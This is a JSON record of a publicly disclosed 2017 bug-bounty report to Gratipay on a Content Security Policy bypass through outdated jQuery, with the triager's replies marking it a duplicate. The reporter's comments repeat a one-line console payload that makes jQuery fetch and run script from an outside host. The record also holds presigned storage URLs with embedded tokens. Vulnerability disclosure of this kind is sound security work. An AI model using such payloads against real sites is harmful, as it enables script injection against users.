@@ -1,0 +1,371 @@
+{
+    "id": 241192,
+    "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNDExOTI=",
+    "url": "https://hackerone.com/reports/241192",
+    "title": "CSP Policy Bypass and javascript execution",
+    "state": "Closed",
+    "substate": "duplicate",
+    "readable_substate": "Duplicate",
+    "created_at": "2017-06-18T16:12:36.462Z",
+    "submitted_at": "2017-06-18T16:12:36.462Z",
+    "is_member_of_team?": false,
+    "is_organization_group_member?": false,
+    "reporter": {
+        "disabled": true,
+        "username": "athuljayaram",
+        "url": "/athuljayaram",
+        "profile_picture_urls": {
+            "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "is_me?": false,
+        "cleared": false,
+        "verified": false,
+        "hackerone_triager": false,
+        "hacker_mediation": false
+    },
+    "team": {
+        "id": 1868,
+        "url": "https://hackerone.com/gratipay",
+        "handle": "gratipay",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/000/001/868/a75c6649c5b4671b3cf44160af884a7da9fd0b67_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
+            "medium": "https://profile-photos.hackerone-user-content.com/variants/000/001/868/a75c6649c5b4671b3cf44160af884a7da9fd0b67_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "permissions": [],
+        "submission_state": "disabled",
+        "default_currency": "usd",
+        "awards_miles": false,
+        "offers_bounties": true,
+        "state": "public_mode",
+        "only_cleared_hackers": false,
+        "pentest_feature_enabled?": false,
+        "profile": {
+            "name": "Gratipay",
+            "twitter_handle": "Gratipay",
+            "website": "https://gratipay.com/",
+            "about": "Gratitude? Gratipay! The easiest way for your company to pay for open source."
+        }
+    },
+    "has_bounty?": false,
+    "in_validation?": false,
+    "can_view_team": true,
+    "can_view_report": true,
+    "is_external_bug": false,
+    "is_published": false,
+    "is_participant": false,
+    "has_collaborators": false,
+    "submitted_by_team_member": false,
+    "stage": 4,
+    "public": true,
+    "visibility": "full",
+    "cve_ids": [],
+    "singular_disclosure_disabled": true,
+    "disclosed_at": "2017-06-18T17:40:27.286Z",
+    "bug_reporter_agreed_on_going_public_at": "2017-06-18T17:40:27.236Z",
+    "team_member_agreed_on_going_public_at": "2017-06-18T16:37:00.988Z",
+    "comments_closed?": false,
+    "facebook_team?": false,
+    "team_private?": false,
+    "vulnerability_information": "Content Security Policy (CSP) is a computer security standard introduced to prevent cross-site scripting (XSS), clickjacking and other code injection attacks resulting from execution of malicious content in the trusted web page context. CSP provides a standard method for website owners to declare approved origins of content that browsers should be allowed to load on that website — covered types are JavaScript, CSS, HTML frames, web workers, fonts, images, embeddable objects such as Java applets, ActiveX, audio and video files, and other HTML5 features.\n\nContent-Security-Policy-Report-Only: default-src 'self';script-src 'self' assets.gratipay.com 'unsafe-inline';style-src 'self' assets.gratipay.com downloads.gratipay.com cloud.typography.com;img-src *;font-src 'self' assets.gratipay.com cloud.typography.com data:;block-all-mixed-content;report-uri https://gratipay.report-uri.io/r/default/csp/reportOnly;\n\n\nin that their is also a report-uri which sends a report on CSP Violation  as POST in case of CSP violation to \nhttps://gratipay.report-uri.io/r/default/csp/reportOnly;\n\n\nI have a captured CSP post request in case of violation\n\nPUT /r/default/csp/reportOnly HTTP/1.1\nHost: gratipay.report-uri.io\nConnection: close\nContent-Length: 738\nOrigin: https://gratipay.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.24 Safari/537.36\nContent-Type: application/csp-report\nAccept: */*\nDNT: 1\nReferer: https://gratipay.com/about/pricing\nAccept-Language: en-GB,en-US;q=0.8,en;q=0.6\n\n{\"csp-report\":{\"document-uri\":\"https://gratipay.com/about/pricing\",\"referrer\":\"https://gratipay.com/about/\",\"violated-directive\":\"connect-src\",\"effective-directive\":\"connect-src\",\"original-policy\":\"default-src 'self';script-src 'self' assets.gratipay.com 'unsafe-inline';style-src 'self' assets.gratipay.com downloads.gratipay.com cloud.typography.com;img-src *;font-src 'self' assets.gratipay.com cloud.typography.com data:;block-all-mixed-content;report-uri https://gratipay.report-uri.io/r/default/csp/reportOnly;\",\"disposition\":\"report\",\"blocked-uri\":\"https://sakurity.com/\",\"line-number\":8,\"column-number\":26577,\"source-file\":\"https://assets.gratipay.com/vendors.js?etag=rTtsoO9IGH-cTRpSMarMHQ~~\",\"status-code\":0,\"script-sample\":\"\"}}\n\n\n\n\nI like to use $.get('https://sakurity.com/jqueryxss'); as input to show the CSP policy bypass\n\nby using $.get('https://sakurity.com/jqueryxss'); I was able to bypass allowed CSP policy though https://sakurity.com is not allowed an approved origin of content, still I am able to fetch it and it didn't issue a POST request (report-uri attribute of CSP) which sends a report in case of any CSP violation ,\n\n\nSo using $.get request \nit didn't send a CSP report \nit read the remote content and executed the javascript\n\n\n\n\n\nSOLUTION\nUpdate your javascript libraries mainly jquery  elements to the latest version\n\n",
+    "original_report_id": null,
+    "original_report_url": null,
+    "attachments": [
+        {
+            "id": 195246,
+            "file_name": "gratipay_com.png",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/195/246/268cbeeb24fbc8b4a83acc14aa5b2b3d71f0e80f/gratipay_com.png?response-content-disposition=attachment%3B%20filename%3D%22gratipay_com.png%22%3B%20filename%2A%3DUTF-8%27%27gratipay_com.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ44TLZFA6%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T080246Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCm8A5VicKSFdKk4pT1CD%2B9aD8whwsKjbgyswTJtjuCwwIgbQkNA5LWAijPuPYCLq2qw1BsS6Km0Nr%2BSAzJkxT%2F5rAquwUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDAUh5bnfX42OeHzAHCqPBUk2d8HAsYNgcRvKeT%2Ftc%2FDmhEt%2BerxJO7sajeYJjcelj5odT9W%2BTjlYl%2FmZpvLn2NiyiCQF9Wk4UHySsA0Oh4Uy6pfeocYAP0EKkS1IkVCEN4YmtMmlZyEn0SMPDogzrH%2B4Ed7VuR54IPkzn2euwtWjhFaoiB2RLVqGBd%2B3e%2BLlXfdpHvvGfAAJ83tKHpZ1yhkO4u%2B2kTkemBBR4lSYuCVoWFlhWFlkmAVIkqUlvhoH5GuaCdNomHfYVz%2BbqDpMHPZrvySz7mACWoEt4Qwrs8Gyc%2BkTdPZaB%2F46k9vOi0Lko2Zc5Pt7N1%2FpAzZKupnNrcebhhPktqHvghxuPXdBkaa6NywOX8Mj7J3vmJYUPDMjNLY9RL9TloFCSyL%2BH7e9vgnNVP7WFvFBgt3yUqy6VR%2BVwCsXW9rXX5iUoiQr952qwjX%2BCBjmbl50%2BefXi3eA6h%2FrW8sbQNY8ZLGU3811e6J6ZxIcsGKFT6%2BNe1mlCEvaagQVBSwgft9Qvw5G933uZkkIIRrecVrrxV1Kdyf18UuksHfwWvoPsxTVqLghh1fsH9QzD5tW58%2FuV%2BDHNjcO0Y7MfQZYf%2F1KIm3T12pyBS%2BByAc4M%2B4H%2BznSX1O17idlgZ4aptmYnQdIAYPd1qvB9lGCmmvvyGrknfkQaumBhDcQRGSxQFRN7cUVHj1ZxM08uZpmvLxXBbtA%2BhkRMuKZUZROk8poKap2OCWR%2Fr5QTQpIvE0RO0BqlOYwF8g6GjE%2BJfumo%2B%2BP2Uarii4%2Bi4%2BnE6cXCeTiqSJSit9AKwwjsJnpBl2IgfTN1pfXYi5HjCgmBb3PWeFvRjFiLm8dOZgU7wZl749NK%2F25A2jO3VQqu5SUZmK0%2B89WyBYfPCX8vU4wlrC2pwY6sQGYpjFrGNKqUhFm3ihi0%2Fxb68dwJpw2ByqbkEntVKLgVrut%2FErgh8ywfClfdrPrYCeAtSFYHBUVlsWTASBv82isMRBVL%2BvEfK0fjMoUXbiSGB9RIsWYEaAFc2AlCy%2F7ArBadwZY9ywlDeeztTmEKiauvWxW%2FbQ7z5x5fmIylqk1nm%2Fr%2BPnkssGbY5t572aOr%2B1M2PUkmomm8AQ%2FOb5Mm0Wx0dRE01Xqm0W4DAD%2F9JIWsTA%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=6f956ff0bd3da57927a805fae0ecd4627135bb485a3e27a3d37afc5219f6b25d",
+            "file_size": 70246,
+            "type": "image/png"
+        }
+    ],
+    "allow_singular_disclosure_at": null,
+    "vote_count": 4,
+    "voters": [
+        "eveeez",
+        "b7de13fb79e2483638f04b8",
+        "sumit7",
+        "juniorhero"
+    ],
+    "structured_scope": null,
+    "abilities": {
+        "assignable_team_members": [],
+        "assignable_team_member_groups": []
+    },
+    "activities": [
+        {
+            "id": 1764021,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hi,\n\nThank you for your report, the receipt of which we herewith confirm. We are currently verifying the issue you reported.\n\nPlease expect additional feedback from us within the next couple of days. The \"INFORMATION SECURITY\" section of the following page has additional, useful information regarding our platform's security: http://inside.gratipay.com/howto/manage-risk\n\nWe appreciate your interest in securing our platform and look forward to working with you.\n\nYours sincerely,\nThe Gratipay Security Team",
+            "automated_response": true,
+            "created_at": "2017-06-18T16:12:36.605Z",
+            "updated_at": "2017-06-18T16:12:36.605Z",
+            "actor": {
+                "url": "/gratipay",
+                "ibb": false,
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/001/868/a75c6649c5b4671b3cf44160af884a7da9fd0b67_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "profile": {
+                    "name": "Gratipay"
+                }
+            },
+            "genius_execution_id": null,
+            "team_handle": "gratipay"
+        },
+        {
+            "id": 1764037,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugDuplicate",
+            "message": "Hi @athuljayaram,\n\nThanks for the report. Unfortunately, this has already been reported to us and we are working on a [fix](https://github.com/gratipay/gratipay.com/pull/4377). We look forward to more reports from you in the future.\n\nBest regards,\nEd",
+            "automated_response": false,
+            "created_at": "2017-06-18T16:36:54.464Z",
+            "updated_at": "2017-06-18T16:36:54.464Z",
+            "actor": {
+                "username": "edoverflow",
+                "cleared": false,
+                "verified": false,
+                "url": "/edoverflow",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "gratipay"
+        },
+        {
+            "id": 1764038,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2017-06-18T16:37:01.007Z",
+            "updated_at": "2017-06-18T16:37:01.007Z",
+            "first_to_agree": true,
+            "actor": {
+                "username": "edoverflow",
+                "cleared": false,
+                "verified": false,
+                "url": "/edoverflow",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "gratipay"
+        },
+        {
+            "id": 1764042,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Ok, I didn't know that\n\nIt can cause self-xss too\n\nIt would be nice of you if you can thank me on hackerone\n\nI had put a lot of effort in identifying this vulnerability\n",
+            "automated_response": false,
+            "created_at": "2017-06-18T16:55:31.208Z",
+            "updated_at": "2017-06-18T16:55:31.208Z",
+            "actor": {
+                "username": "athuljayaram",
+                "cleared": false,
+                "verified": false,
+                "url": "/athuljayaram",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "gratipay"
+        },
+        {
+            "id": 1764084,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2017-06-18T17:40:27.255Z",
+            "updated_at": "2017-06-18T17:40:27.255Z",
+            "actor": {
+                "username": "athuljayaram",
+                "cleared": false,
+                "verified": false,
+                "url": "/athuljayaram",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "gratipay"
+        },
+        {
+            "id": 1764085,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ReportBecamePublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2017-06-18T17:40:27.303Z",
+            "updated_at": "2017-06-18T17:40:27.303Z",
+            "actor": {
+                "username": "athuljayaram",
+                "cleared": false,
+                "verified": false,
+                "url": "/athuljayaram",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "gratipay"
+        },
+        {
+            "id": 1765041,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hi @athuljayaram,\n\nIn order to really exploit this issue, you need to find one of these two scenarios:\n\n1. Any cross domain requests to untrusted domains which may inadvertently execute script.\n2. Any requests to trusted API endpoints where script can be injected into data sources.\n\nIf you can demonstrate an XSS vulnerability with a thorough PoC we will reward you accordingly.\n\n> It would be nice of you if you can thank me on hackerone\n\nYou are on our \"[Disclosures](http://inside.gratipay.com/appendices/disclosures)\" page. :)\n\nWe look forward to more reports from you in the future.\n\nBest regards,\nEd",
+            "automated_response": false,
+            "created_at": "2017-06-19T12:25:08.873Z",
+            "updated_at": "2017-06-19T12:25:08.873Z",
+            "actor": {
+                "username": "edoverflow",
+                "cleared": false,
+                "verified": false,
+                "url": "/edoverflow",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "gratipay"
+        },
+        {
+            "id": 1766014,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hello edio\n\nI have clearly shown it can send cross domain requests to untrusted domains which may inadvertently execute script.\n\nExecute it in console\n\n $.get('https://sakurity.com/jqueryxss'); \n\n\n\n",
+            "automated_response": false,
+            "created_at": "2017-06-19T18:34:10.841Z",
+            "updated_at": "2017-06-19T18:34:10.841Z",
+            "actor": {
+                "username": "athuljayaram",
+                "cleared": false,
+                "verified": false,
+                "url": "/athuljayaram",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "gratipay"
+        },
+        {
+            "id": 1766015,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "$.get('https://sakurity.com/jqueryxss');\n\nIt can execute XSS",
+            "automated_response": false,
+            "created_at": "2017-06-19T18:34:36.963Z",
+            "updated_at": "2017-06-19T18:34:36.963Z",
+            "actor": {
+                "username": "athuljayaram",
+                "cleared": false,
+                "verified": false,
+                "url": "/athuljayaram",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "gratipay"
+        },
+        {
+            "id": 1766110,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "You also categorised this issue as duplicate...kindly tell me this is duplicate to what?\n \nthis is an original issue and even if u include script-src in the content security policy or not\n\nit will still execute\n\n",
+            "automated_response": false,
+            "created_at": "2017-06-19T19:00:43.973Z",
+            "updated_at": "2017-06-19T19:00:43.973Z",
+            "actor": {
+                "username": "athuljayaram",
+                "cleared": false,
+                "verified": false,
+                "url": "/athuljayaram",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "gratipay"
+        },
+        {
+            "id": 1770723,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hi @athuljayaram,\n\nThe duplicate report is located over at #211149 and there is already a [PR](https://github.com/gratipay/gratipay.com/pull/4377) in queue for this issue.\n\nThe beauty of [Egor Homakov](https://twitter.com/homakov)'s discovery is the fact that one can really exploit this issue without pasting anything into the console. All you need to do is find one of the two scenarios I have listed above. \n\nOn a side note, we also discourage users from pasting anything into the console with the following message:\n\n{F196025}\n\nBest regards,\nEd",
+            "automated_response": false,
+            "created_at": "2017-06-21T09:05:01.578Z",
+            "updated_at": "2017-06-21T09:05:24.779Z",
+            "actor": {
+                "username": "edoverflow",
+                "cleared": false,
+                "verified": false,
+                "url": "/edoverflow",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "attachments": [
+                {
+                    "id": 196025,
+                    "filename": "gratipay_console.PNG",
+                    "type": "image/png",
+                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/196/025/b1689add7f8d909c3f498c5f86e09b6f997d30da/gratipay_console.PNG?response-content-disposition=attachment%3B%20filename%3D%22gratipay_console.PNG%22%3B%20filename%2A%3DUTF-8%27%27gratipay_console.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ44TLZFA6%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T080246Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCm8A5VicKSFdKk4pT1CD%2B9aD8whwsKjbgyswTJtjuCwwIgbQkNA5LWAijPuPYCLq2qw1BsS6Km0Nr%2BSAzJkxT%2F5rAquwUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDAUh5bnfX42OeHzAHCqPBUk2d8HAsYNgcRvKeT%2Ftc%2FDmhEt%2BerxJO7sajeYJjcelj5odT9W%2BTjlYl%2FmZpvLn2NiyiCQF9Wk4UHySsA0Oh4Uy6pfeocYAP0EKkS1IkVCEN4YmtMmlZyEn0SMPDogzrH%2B4Ed7VuR54IPkzn2euwtWjhFaoiB2RLVqGBd%2B3e%2BLlXfdpHvvGfAAJ83tKHpZ1yhkO4u%2B2kTkemBBR4lSYuCVoWFlhWFlkmAVIkqUlvhoH5GuaCdNomHfYVz%2BbqDpMHPZrvySz7mACWoEt4Qwrs8Gyc%2BkTdPZaB%2F46k9vOi0Lko2Zc5Pt7N1%2FpAzZKupnNrcebhhPktqHvghxuPXdBkaa6NywOX8Mj7J3vmJYUPDMjNLY9RL9TloFCSyL%2BH7e9vgnNVP7WFvFBgt3yUqy6VR%2BVwCsXW9rXX5iUoiQr952qwjX%2BCBjmbl50%2BefXi3eA6h%2FrW8sbQNY8ZLGU3811e6J6ZxIcsGKFT6%2BNe1mlCEvaagQVBSwgft9Qvw5G933uZkkIIRrecVrrxV1Kdyf18UuksHfwWvoPsxTVqLghh1fsH9QzD5tW58%2FuV%2BDHNjcO0Y7MfQZYf%2F1KIm3T12pyBS%2BByAc4M%2B4H%2BznSX1O17idlgZ4aptmYnQdIAYPd1qvB9lGCmmvvyGrknfkQaumBhDcQRGSxQFRN7cUVHj1ZxM08uZpmvLxXBbtA%2BhkRMuKZUZROk8poKap2OCWR%2Fr5QTQpIvE0RO0BqlOYwF8g6GjE%2BJfumo%2B%2BP2Uarii4%2Bi4%2BnE6cXCeTiqSJSit9AKwwjsJnpBl2IgfTN1pfXYi5HjCgmBb3PWeFvRjFiLm8dOZgU7wZl749NK%2F25A2jO3VQqu5SUZmK0%2B89WyBYfPCX8vU4wlrC2pwY6sQGYpjFrGNKqUhFm3ihi0%2Fxb68dwJpw2ByqbkEntVKLgVrut%2FErgh8ywfClfdrPrYCeAtSFYHBUVlsWTASBv82isMRBVL%2BvEfK0fjMoUXbiSGB9RIsWYEaAFc2AlCy%2F7ArBadwZY9ywlDeeztTmEKiauvWxW%2FbQ7z5x5fmIylqk1nm%2Fr%2BPnkssGbY5t572aOr%2B1M2PUkmomm8AQ%2FOb5Mm0Wx0dRE01Xqm0W4DAD%2F9JIWsTA%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=11d4e737589d9a272096eda75bd83326985d5a8bdf45e86b8faf71d8a0dab7f7"
+                }
+            ],
+            "genius_execution_id": null,
+            "team_handle": "gratipay"
+        }
+    ],
+    "activity_page_count": 1,
+    "activity_page_number": 1,
+    "summaries": [
+        {
+            "category": "team",
+            "can_view?": true,
+            "can_create?": false
+        },
+        {
+            "category": "researcher",
+            "can_view?": true,
+            "can_create?": false
+        }
+    ]
+}
